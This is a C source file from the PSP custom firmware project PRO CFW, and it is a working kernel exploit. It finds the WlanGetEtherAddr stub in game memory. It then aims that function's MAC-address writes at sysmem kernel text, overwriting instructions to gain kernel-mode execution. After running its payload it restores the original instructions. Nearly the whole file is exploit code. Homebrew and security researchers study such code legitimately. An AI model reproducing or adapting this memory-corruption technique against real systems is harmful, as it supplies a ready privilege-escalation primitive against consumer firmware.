/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspumd.h>
#include <module2.h>
#include <lflash0.h>
#include <macros.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include "kxploit.h"
#include "libs/debug/graphics.h"
#include "loader/encLoader/encryptloader.h"

extern FunctionTable *g_tbl;

#ifdef GAME_GET_ETHER_ADDR
int (* WlanGetEtherAddr)(unsigned char *destAddr) = (void *)(GAME_TEXT + GAME_GET_ETHER_ADDR);
#else
int (* WlanGetEtherAddr)(unsigned char *destAddr) = NULL;
#endif

// Find pspnet_adhoc_matching.prx WlanGetEtherAddr Stub
void * FindWlanGetEtherAddr(void)
{
	// Search Start Position
	unsigned int * start = (unsigned int *)GAME_TEXT;
	
	// Search Force End Position
	unsigned int * end = (unsigned int *)(USER_BASE + USER_SIZE);
	
	// Current Position in RAM
	unsigned int * p = start;
	
	// Scan Memory
	for(; p < end - 8; p += 64)
	{
		// Found pspnet_adhoc_matching.prx Text Address
		if (*p == 0x27BDFFE0 && \
				*(p+1) == 0xAFB10014 && \
				*(p+2) == 0x00808821 && \
				*(p+3) == 0xAFBF001C && \
				*(p+4) == 0xAFB20018 && \
				*(p+6) == 0xAFB00010 && \
				*(p+7) == 0x28440BE0 && \
				*(p+8) == 0x3C058041
				)
			break;
	}
	
	// Didn't find it... :(
	if(p >= end - 8)
		return NULL;
	
	
	// Calculate WlanGetEtherAddr Stub Address
	p += WLAN_GET_ETHER_ADDR_STUB / 4;
	
	// Return it. :D
	return p;
}

// Load required Libraries for WlanGetEtherAddr
int stubScanner(void)
{
	if (WlanGetEtherAddr != NULL)
		return 0;

	#ifdef USE_GAME_UTILITY_LOAD_MODULE
	
	// Load Modules via sceUtilityLoadModule (if available)
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);	// 0x100
	g_tbl->UtilityLoadModule(PSP_MODULE_NET_ADHOC);	// 0x101

	#else
	
	#ifdef USE_GAME_UTILITY_LOAD_NET_MODULE
	
	// Load Modules via sceUtilityLoadNetModule (if available)
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_COMMON);	// 1
	g_tbl->UtilityLoadNetModule(PSP_NET_MODULE_ADHOC);	// 2
	
	#endif
	
	#endif
	
	// Find WlanGetEtherAddr in Memory
	WlanGetEtherAddr = FindWlanGetEtherAddr();

	if (WlanGetEtherAddr == NULL)
		return -1;

	return 0;
}

int doExploit(void)
{
	unsigned char *sysmemAddr = (unsigned char *)SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR;

	WlanGetEtherAddr(sysmemAddr);
	WlanGetEtherAddr(sysmemAddr - 2);
	WlanGetEtherAddr(sysmemAddr - 4);
	WlanGetEtherAddr(sysmemAddr - 6);

	return 0;
}

void executeKernel(void)
{
	g_tbl->KernelLibcTime(0, KERNELIFY(kernelContentFunction), 0, 0, 0);
}

void repairInstruction(void)
{
	// checked in 1.61, 1.67, 1.69 1.80
	_sw(0x0200D821, SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR - 4);
	_sw(0x3C038801, SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR);
	_sw(0x8C654384, SYSMEM_TEXT + KXPLOIT_TARGET_INSTR_ADDR + 4);
}
